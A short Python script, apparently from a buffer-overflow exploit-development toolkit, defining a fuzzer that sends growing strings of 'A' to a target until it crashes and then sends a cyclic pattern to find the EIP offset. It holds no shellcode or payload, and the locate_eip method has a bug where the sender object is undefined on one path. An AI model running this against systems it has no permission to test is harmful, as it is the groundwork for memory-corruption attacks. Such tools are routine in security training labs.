#!/usr/bin/python3

from time import sleep
from send_request import Send
from create_pattern import Pattern


class Fuzz:

    def __init__(self, target):
        self.TARGET = target

    def find_crash(self, fuzz_len=100):

        buffer = "A" * fuzz_len
        s = Send(self.TARGET)

        while True:
            try:
                s.send_payload(buffer)
                sleep(1)
                buffer = buffer + "A" * fuzz_len
            except:
                return len(buffer)

    def locate_eip(self, pattern='', length=0):
        if length > 0:
            pat = Pattern()
            pattern = pat.create_pattern(length)
            s = Send(self.TARGET)
        try:
            s.send_payload(pattern)
        except:
            print("Program crashed...")